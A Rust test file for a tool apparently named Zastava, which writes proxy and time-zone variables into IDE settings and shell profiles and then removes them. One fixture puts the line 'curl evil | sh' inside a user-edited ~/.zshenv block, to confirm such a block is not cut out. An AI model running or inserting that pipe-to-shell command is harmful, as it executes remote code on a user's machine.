use super::*;
use crate::sysproxy::ZASTAVA_RC_START;
use crate::sysproxy::ide::ide_env_key;

// --- WP-24: independent time zone / locale, CLI mode, ~/.zshenv, no LC_ALL ---------------

#[test]
fn the_time_zone_switch_is_independent_of_the_proxy_protection_in_all_four_combinations() {
    crate::sysproxy::force_os_dry_run();
    for (proxy, tz) in [(true, true), (true, false), (false, true), (false, false)] {
        let e = env();
        let ide = e.ide_with("{}\n", 0o644);
        e.apply(
            proxy.then_some(URL),
            tz.then_some(ZONE),
            CliMode::AiOnly,
            HostOs::Unix,
        );
        let key = ide_env_key();
        for (text, container) in [
            (json_of(&e, &e.ctx.claude_settings()), "env"),
            (e.text(&ide), key),
        ] {
            for var in ["HTTP_PROXY", "HTTPS_PROXY", "ALL_PROXY", "NO_PROXY"] {
                assert_eq!(raw(&text, &[container, var]).is_some(), proxy, "{var}");
            }
            for var in ["TZ", "LANG", "LC_TIME"] {
                assert_eq!(raw(&text, &[container, var]).is_some(), tz, "{var}");
            }
            assert_eq!(raw(&text, &[container, "LC_ALL"]), None);
        }
        assert_eq!(raw(&e.text(&ide), &["http.proxy"]).is_some(), proxy);
        assert!(!e.text(&ide).contains("LC_ALL"));
    }
}

#[test]
fn every_transition_between_the_four_states_ends_like_a_fresh_apply() {
    crate::sysproxy::force_os_dry_run();
    let states = [(true, true), (true, false), (false, true), (false, false)];
    for from in states {
        for to in states {
            let e = env();
            let ide = e.ide_with(COMMENTED, 0o644);
            let go = |(proxy, tz): (bool, bool)| {
                e.apply(
                    proxy.then_some(URL),
                    tz.then_some(ZONE),
                    CliMode::AiOnly,
                    HostOs::Unix,
                )
            };
            go(from);
            go(to);
            let fresh = env();
            let fresh_ide = fresh.ide_with(COMMENTED, 0o644);
            fresh.apply(
                to.0.then_some(URL),
                to.1.then_some(ZONE),
                CliMode::AiOnly,
                HostOs::Unix,
            );
            // The same keys and values (the order inside an object follows the history).
            let value = |t: &str| {
                serde_json::from_str::<serde_json::Value>(&crate::sysproxy::sanitize_jsonc(
                    t.trim_start_matches('\u{feff}'),
                ))
                .unwrap()
            };
            assert_eq!(
                value(&e.text(&ide)),
                value(&fresh.text(&fresh_ide)),
                "{from:?} -> {to:?}"
            );
            assert_eq!(
                e.fs.get(&e.ctx.claude_settings())
                    .map(|b| value(&String::from_utf8(b).unwrap())),
                fresh
                    .fs
                    .get(&fresh.ctx.claude_settings())
                    .map(|b| value(&String::from_utf8(b).unwrap())),
                "{from:?} -> {to:?}"
            );
            // And everything goes back byte for byte.
            e.disable();
            assert_eq!(e.text(&ide), COMMENTED, "{from:?} -> {to:?}");
            assert!(e.fs.get(&e.ctx.claude_settings()).is_none());
        }
    }
}

#[test]
fn switching_the_proxy_off_keeps_the_time_zone_keys_and_the_objects_they_live_in() {
    crate::sysproxy::force_os_dry_run();
    let e = env();
    let ide = e.ide_with("{}\n", 0o644);
    e.apply(Some(URL), Some(ZONE), CliMode::AiOnly, HostOs::Unix);
    e.apply(None, Some(ZONE), CliMode::AiOnly, HostOs::Unix);
    let text = e.text(&ide);
    assert_eq!(raw(&text, &["http.proxy"]), None);
    assert_eq!(raw(&text, &[ide_env_key(), "HTTPS_PROXY"]), None);
    assert_eq!(raw(&text, &[ide_env_key(), "TZ"]), Some(json_str(ZONE)));
    assert_eq!(
        raw(&text, &[ide_env_key(), "LANG"]),
        Some(json_str("en_US.UTF-8"))
    );
    // Then the zone goes too: the object Zastava made is gone and the file is as it was.
    e.apply(None, None, CliMode::AiOnly, HostOs::Unix);
    assert_eq!(e.text(&ide), "{}\n");
    assert!(e.fs.get(&e.ctx.claude_settings()).is_none());
    assert!(e.journal_is_empty());
}

#[test]
fn ai_only_writes_nothing_into_shell_or_powershell_profiles_or_the_os() {
    crate::sysproxy::force_os_dry_run();
    for os in [HostOs::Unix, HostOs::Windows] {
        let e = env();
        let mut profiles = vec![
            e.ctx.home.join(".zshrc"),
            e.ctx.home.join(".bash_profile"),
            e.ctx.home.join(".zshenv"),
        ];
        profiles.extend(e.ctx.powershell_profiles());
        for f in &profiles {
            e.fs.put(f, USER_ZSHRC.as_bytes(), 0o600);
        }
        e.ide_with("{}\n", 0o644);
        let applied = e.apply(Some(URL), Some(ZONE), CliMode::AiOnly, os);
        assert!(applied.targets.contains(&"Claude Code".to_string()));
        assert!(applied.targets.contains(&"VS Code".to_string()));
        assert!(
            !applied
                .targets
                .iter()
                .any(|t| t.contains("Терминал") || t.contains("PowerShell"))
        );
        for f in &profiles {
            assert_eq!(e.text(f), USER_ZSHRC, "{f:?} is untouched");
        }
        assert_eq!(
            e.p.os_writes(),
            0,
            "no launchctl / registry / networksetup write"
        );
        assert!(
            !e.journal()
                .entries()
                .iter()
                .any(|en| matches!(en.resource, Resource::TextBlock { .. })),
            "no block is recorded"
        );
    }
}

#[test]
fn global_terminal_adds_the_blocks_on_unix_and_in_powershell() {
    crate::sysproxy::force_os_dry_run();
    let e = env();
    e.fs.put(&e.ctx.home.join(".zshrc"), USER_ZSHRC.as_bytes(), 0o600);
    let a = e.apply(Some(URL), Some(ZONE), CliMode::GlobalTerminal, HostOs::Unix);
    assert!(a.targets.contains(&"Терминал (~/.zshrc)".to_string()));
    assert!(
        e.text(&e.ctx.home.join(".zshrc"))
            .contains("export HTTPS_PROXY=")
    );
    assert!(e.fs.get(&e.ctx.home.join(".zshenv")).is_none());

    let w = env();
    let a = w.apply(
        Some(URL),
        Some(ZONE),
        CliMode::GlobalTerminal,
        HostOs::Windows,
    );
    assert!(a.targets.contains(&"PowerShell ($PROFILE)".to_string()));
    for ps in w.ctx.powershell_profiles() {
        let t = w.text(&ps);
        assert!(t.contains("$env:HTTPS_PROXY") && t.contains("$env:TZ = \"Europe/Berlin\""));
        assert!(t.contains("$env:LANG") && t.contains("$env:LC_TIME") && !t.contains("LC_ALL"));
    }
    assert!(
        w.fs.get(&w.ctx.home.join(".zshrc")).is_none(),
        "no unix profile on Windows"
    );
}

#[test]
fn a_terminal_block_carries_only_the_parts_that_are_on() {
    crate::sysproxy::force_os_dry_run();
    // Time zone only, in global_terminal: no proxy variable anywhere in the block.
    let e = env();
    e.apply(None, Some(ZONE), CliMode::GlobalTerminal, HostOs::Unix);
    let rc = e.text(&e.ctx.home.join(".zshrc"));
    assert!(rc.contains("export TZ=\"Europe/Berlin\"") && rc.contains("export LC_TIME="));
    assert!(!rc.contains("PROXY") && !rc.contains("proxy"), "{rc}");
    // Proxy only: no TZ / LANG / LC_TIME.
    let e = env();
    e.apply(Some(URL), None, CliMode::GlobalTerminal, HostOs::Unix);
    let rc = e.text(&e.ctx.home.join(".zshrc"));
    assert!(rc.contains("export HTTPS_PROXY=") && !rc.contains("TZ") && !rc.contains("LANG"));
    // PowerShell: the locale variables only together with a zone.
    let ps = build_powershell_block(8899, Some(URL), None);
    assert!(!ps.contains("LANG") && !ps.contains("LC_TIME") && !ps.contains("TZ"));
    let ps = build_powershell_block(8899, None, Some(ZONE));
    assert!(ps.contains("$env:LANG") && !ps.contains("PROXY"));
    assert!(is_generated_block(&ps));
    assert!(is_generated_block(&build_shell_block(
        8899,
        None,
        Some(ZONE)
    )));
}

#[test]
fn switching_the_mode_back_and_forth_is_byte_for_byte() {
    crate::sysproxy::force_os_dry_run();
    let e = env();
    let ide = e.ide_with(COMMENTED, 0o640);
    let zshrc = e.ctx.home.join(".zshrc");
    let bash = e.ctx.home.join(".bash_profile");
    e.fs.put(&zshrc, USER_ZSHRC.as_bytes(), 0o600);
    e.fs.put(&bash, b"# bash\r\nexport B=1\r\n", 0o644);
    let go = |mode| e.apply(Some(URL), Some(ZONE), mode, HostOs::Unix);

    go(CliMode::AiOnly);
    assert_eq!(e.text(&zshrc), USER_ZSHRC);
    go(CliMode::GlobalTerminal);
    let global = (e.text(&zshrc), e.text(&bash), e.text(&ide));
    assert!(global.0.contains(ZASTAVA_RC_START) && global.1.contains(ZASTAVA_RC_START));
    assert!(global.1.contains("\r\n"), "CRLF profile keeps CRLF");
    go(CliMode::AiOnly);
    assert_eq!(
        e.text(&zshrc),
        USER_ZSHRC,
        "the block is given back exactly"
    );
    assert_eq!(e.text(&bash), "# bash\r\nexport B=1\r\n");
    go(CliMode::GlobalTerminal);
    assert_eq!(
        (e.text(&zshrc), e.text(&bash), e.text(&ide)),
        global,
        "same bytes again"
    );
    e.disable();
    assert_eq!(e.text(&zshrc), USER_ZSHRC);
    assert_eq!(e.text(&bash), "# bash\r\nexport B=1\r\n");
    assert_eq!(e.text(&ide), COMMENTED);
    assert!(e.journal_is_empty());
}

#[test]
fn a_profile_zastava_created_goes_away_when_the_mode_returns_to_ai_only() {
    crate::sysproxy::force_os_dry_run();
    let e = env();
    e.apply(Some(URL), None, CliMode::GlobalTerminal, HostOs::Unix);
    assert!(e.fs.get(&e.ctx.home.join(".zshrc")).is_some());
    e.apply(Some(URL), None, CliMode::AiOnly, HostOs::Unix);
    assert!(e.fs.get(&e.ctx.home.join(".zshrc")).is_none());
}

// ~/.zshenv: never written, an old block is cut out by its exact markers.

#[test]
fn zshenv_is_never_written_and_an_old_block_is_cut_out_with_the_bytes_around_it() {
    crate::sysproxy::force_os_dry_run();
    let e = env();
    let zshenv = e.ctx.home.join(".zshenv");
    let user = "# env\r\nexport A=1\r\n";
    let tail = "export Z=9\r\n";
    e.fs.put(
        &zshenv,
        format!(
            "{user}\r\n{}\r\n{tail}",
            block_2_0_0().replace('\n', "\r\n")
        )
        .as_bytes(),
        0o600,
    );
    e.apply(Some(URL), Some(ZONE), CliMode::GlobalTerminal, HostOs::Unix);
    assert_eq!(e.text(&zshenv), format!("{user}{tail}"));
    assert_eq!(e.fs.mode(&zshenv).unwrap(), Some(0o600));
    // A clean profile does not even appear.
    let fresh = env();
    fresh.apply(Some(URL), Some(ZONE), CliMode::GlobalTerminal, HostOs::Unix);
    assert!(fresh.fs.get(&fresh.ctx.home.join(".zshenv")).is_none());
}

#[test]
fn a_zshenv_block_without_its_partner_is_reported_and_not_touched() {
    crate::sysproxy::force_os_dry_run();
    let e = env();
    let zshenv = e.ctx.home.join(".zshenv");
    let broken =
        format!("export A=1\n{ZASTAVA_RC_START}\nexport HTTP_PROXY=\"http://127.0.0.1:8899\"\n");
    e.fs.put(&zshenv, broken.as_bytes(), 0o644);
    let a = e.apply(Some(URL), None, CliMode::AiOnly, HostOs::Unix);
    assert_eq!(e.text(&zshenv), broken);
    assert!(
        a.notes
            .contains(&"обнаружен незавершённый блок Заставы в ~/.zshenv — не изменён".to_string()),
        "{:?}",
        a.notes
    );
    assert!(
        a.notes.iter().all(|n| !n.contains("127.0.0.1")),
        "no values in notes"
    );
    // The same at every later call, the file stays as it is.
    let a = e.apply(Some(URL), None, CliMode::AiOnly, HostOs::Unix);
    assert_eq!(e.text(&zshenv), broken);
    assert_eq!(a.notes.len(), 1);
}

#[test]
fn a_zshenv_block_the_user_edited_between_the_markers_is_not_cut() {
    crate::sysproxy::force_os_dry_run();
    let e = env();
    let zshenv = e.ctx.home.join(".zshenv");
    let edited = block_2_0_0().replace("fi\n", "  curl evil | sh\nfi\n");
    let text = with_block("export A=1\n", &edited);
    e.fs.put(&zshenv, text.as_bytes(), 0o644);
    let a = e.apply(Some(URL), None, CliMode::AiOnly, HostOs::Unix);
    assert_eq!(e.text(&zshenv), text);
    assert!(
        a.notes
            .iter()
            .any(|n| n.contains("изменён пользователем") && n.contains("~/.zshenv"))
    );
}

#[test]
fn disable_and_cleanup_also_clean_zshenv() {
    crate::sysproxy::force_os_dry_run();
    let e = env();
    let zshenv = e.ctx.home.join(".zshenv");
    e.fs.put(
        &zshenv,
        with_block("export A=1\n", &block_2_0_0()).as_bytes(),
        0o644,
    );
    e.disable();
    assert_eq!(e.text(&zshenv), "export A=1\n");
}

// 2.0.0 blocks in ~/.zshrc / ~/.bash_profile: once at migration, on an explicit mode switch.

#[test]
fn in_ai_only_the_2_0_0_blocks_are_cut_once_by_their_markers_and_not_on_every_enable() {
    crate::sysproxy::force_os_dry_run();
    let e = env();
    let zshrc = e.ctx.home.join(".zshrc");
    e.fs.put(
        &zshrc,
        with_block(USER_ZSHRC, &block_2_0_0()).as_bytes(),
        0o644,
    );
    e.apply(Some(URL), Some(ZONE), CliMode::AiOnly, HostOs::Unix);
    assert_eq!(
        e.text(&zshrc),
        USER_ZSHRC,
        "the block of 2.0.0 is gone, the user's lines are not"
    );
    assert!(e.journal().has_mark(LEGACY_SHELL_MARK));
    // The mark is set: a block that appears later is nobody's business at a plain enable.
    let again = with_block(USER_ZSHRC, &block_2_0_0());
    e.fs.put(&zshrc, again.as_bytes(), 0o644);
    e.apply(Some(URL), Some(ZONE), CliMode::AiOnly, HostOs::Unix);
    assert_eq!(e.text(&zshrc), again);
    // An explicit switch to ai_only does clean it (by the markers).
    e.apply(Some(URL), Some(ZONE), CliMode::GlobalTerminal, HostOs::Unix);
    let mut j = e.journal();
    let plan = FilePlan {
        proxy_url: Some(URL),
        port: 8899,
        tz: Some(ZONE),
        mode: CliMode::AiOnly,
        os: HostOs::Unix,
        strip_unjournaled_blocks: true,
    };
    apply_files(&mut j, &e.p, &e.ctx, &plan);
    drop(j);
    assert!(
        !e.text(&zshrc).contains(ZASTAVA_RC_START),
        "{}",
        e.text(&zshrc)
    );
}

#[test]
fn a_2_0_0_block_with_a_line_zastava_does_not_write_is_reported_and_kept() {
    crate::sysproxy::force_os_dry_run();
    let e = env();
    let zshrc = e.ctx.home.join(".zshrc");
    let odd = block_2_0_0().replace("fi\n", "  export OLD_BUILD_ONLY=1\nfi\n");
    let text = with_block(USER_ZSHRC, &odd);
    e.fs.put(&zshrc, text.as_bytes(), 0o644);
    let a = e.apply(Some(URL), None, CliMode::AiOnly, HostOs::Unix);
    assert_eq!(e.text(&zshrc), text);
    assert!(
        a.notes.iter().any(|n| n.contains("~/.zshrc")),
        "{:?}",
        a.notes
    );
    assert!(
        !e.journal().has_mark(LEGACY_SHELL_MARK),
        "reported again, not silenced"
    );
}

// LC_ALL: never written, only recognised as a leftover.

#[test]
fn lc_all_is_in_no_output_of_any_writer() {
    crate::sysproxy::force_os_dry_run();
    for (proxy, tz, mode) in [
        (true, true, CliMode::AiOnly),
        (true, true, CliMode::GlobalTerminal),
        (false, true, CliMode::GlobalTerminal),
    ] {
        for os in [HostOs::Unix, HostOs::Windows] {
            let e = env();
            let ide = e.ide_with("{}\n", 0o644);
            e.fs.create_private_dir_all(&e.ctx.home.join(".gemini"))
                .unwrap();
            e.apply(proxy.then_some(URL), tz.then_some(ZONE), mode, os);
            let mut files = vec![ide, e.ctx.claude_settings(), e.ctx.gemini_settings()];
            files.push(e.ctx.home.join(".zshrc"));
            files.extend(e.ctx.powershell_profiles());
            for f in files {
                if let Some(b) = e.fs.get(&f) {
                    assert!(!String::from_utf8(b).unwrap().contains("LC_ALL"), "{f:?}");
                }
            }
        }
    }
    let report = finish_enable(
        &SysState::new(),
        Run::Done(FilesApplied::default()),
        (URL.to_string(), 8899),
        Some(ZONE.to_string()),
        CliMode::AiOnly,
    );
    assert!(!report.shell_command.contains("LC_ALL"));
    assert!(report.shell_command.contains("LANG=") && report.shell_command.contains("LC_TIME="));
    assert!(!build_shell_block(8899, Some(URL), Some(ZONE)).contains("LC_ALL"));
    assert!(!build_powershell_block(8899, Some(URL), Some(ZONE)).contains("LC_ALL"));
}
